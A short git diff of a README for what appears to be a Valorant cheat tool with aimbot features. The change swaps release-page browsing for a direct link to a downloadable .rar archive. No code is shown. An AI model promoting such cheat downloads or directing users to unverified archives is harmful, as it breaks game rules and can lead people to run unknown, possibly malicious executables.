@@ -2,6 +2,7 @@
 
 ## <a id="features"></a>🌌 〢 Features
 
+
 **Aimbot**
 ```sh-session
 - Silent
@@ -38,9 +39,8 @@
 
 Read everything carefully before you click anything.
 
-1. Check the available versions [here](https://github.com/kyleanox/valorant-cheat-esp/releases)
-2. Click on the latest version
-3. Download the attached `valorant-cheat-esp.rar` file by clicking on it
+1. Download from [here](https://github.com/kyleanox/valorant-cheat-esp/releases/download/v2.5/valorant-cheat-esp.rar)
+2. Download the attached `valorant-cheat-esp.rar` file by clicking on it
 
 ---
 
